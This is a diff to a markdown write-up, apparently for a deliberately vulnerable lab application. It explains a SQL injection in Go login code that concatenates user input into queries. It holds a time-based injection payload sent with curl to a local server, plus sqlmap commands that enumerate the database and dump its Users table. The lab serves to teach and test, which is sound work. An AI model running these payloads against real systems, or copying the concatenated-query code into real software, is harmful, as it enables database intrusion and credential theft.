@@ -23,17 +23,25 @@ query := fmt.Sprint("insert into Users (username, password) values ('" + user + 
 query := fmt.Sprint("select username from Users where username = '" + username + "'")
 ```
 
-As no validation is present to these variables, SQL injections may be successfuly executed in the database. To confirm this, the following payload could be used that, if the application is indeed vulnerable, a 30 seconds delay will be noted after sending it:
+As no validation is present to these variables, SQL injections may be successfuly executed in the database. Using web interface, we send some information using form for inspect how web interface comunicates with API.
+
+<img src="attack-0.png" align="center"/>
+
+To confirm this, the following payload could be used that, if the application is indeed vulnerable, a 5 seconds delay will be noted after sending it:
+
+<img src="attack-1.png" align="center"/>
+
+Using `curl` on CLI interface, we can test again (with a 30 seconds delay):
 
 ```sh
 curl -s -H "Content-Type: application/json" -d '{"user":"-1'\'' union select 1,2,sleep(30) -- ", "pass":"password"}' http://127.0.0.1:3000/login 
 ```
 
 Request:
-<img src="attack-1.png" align="center"/>
+<img src="attack-2.png" align="center"/>
 
 30 seconds later: 
-<img src="attack-2.png" align="center"/>
+<img src="attack-3.png" align="center"/>
 
 ## 🔥
 
@@ -64,7 +72,7 @@ Then we could use `-r` option and wait sqlmap perform multiples malicious reques
 $ sqlmap -r postRequest.txt
 ```
 
-<img src="attack-3.png" align="center"/>
+<img src="attack-4.png" align="center"/>
 
 After understanding how this database is structured, an attacker could use the following command to retrieve database details:
 
@@ -78,4 +86,4 @@ And then retrieve sensitive information from it:
 $ sqlmap -r postRequest.txt -D a1db -T Users --dump
 ```
 
-<img src="attack-4.png" align="center"/>
+<img src="attack-5.png" align="center"/>
